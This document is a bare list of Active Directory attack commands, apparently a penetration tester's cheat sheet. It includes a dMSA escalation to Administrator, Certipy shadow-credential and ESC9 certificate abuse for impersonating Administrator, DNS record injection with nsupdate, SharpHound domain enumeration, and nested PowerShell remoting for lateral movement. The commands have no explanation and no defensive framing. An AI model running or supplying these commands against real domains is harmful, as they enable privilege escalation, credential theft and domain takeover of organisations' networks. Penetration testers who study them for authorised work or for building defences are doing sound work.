commands.command:
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}

certipy shadow auto -username {USER}@{DOMAIN} -password {PASS}! -account Jane
certipy account update -username {USER}@{DOMAIN} -password {PASS}! -user Jane -upn Administrator
certipy req -username jane@{DOMAIN} -hashes {HASH} -ca corp-DC-CA -template ESC9
certipy account update -username {USER}@{DOMAIN} -password {PASS}! -user Jane -upn Jane@{DOMAIN}
certipy auth -pfx adminitrator.pfx -domain {DOMAIN}

nsupdate
> server {DC_IP}
> update add nats-svc.{DOMAIN} 300 A {TARGET}
> send

runas /netonly /user:{DOMAIN}\{USER} cmd.exe
net view \\{DC_IP}
SharpHound.exe -d {DOMAIN} --CollectionMethods Group,LocalAdmin,Session,Trusts,ACL

$cred = Get-Credential ta\redsuit
Invoke-Command -ComputerName bizintel -Credential $cred -ScriptBlock {
    Invoke-Command -ComputerName secdev -Credential $cred -ScriptBlock {hostname}
}
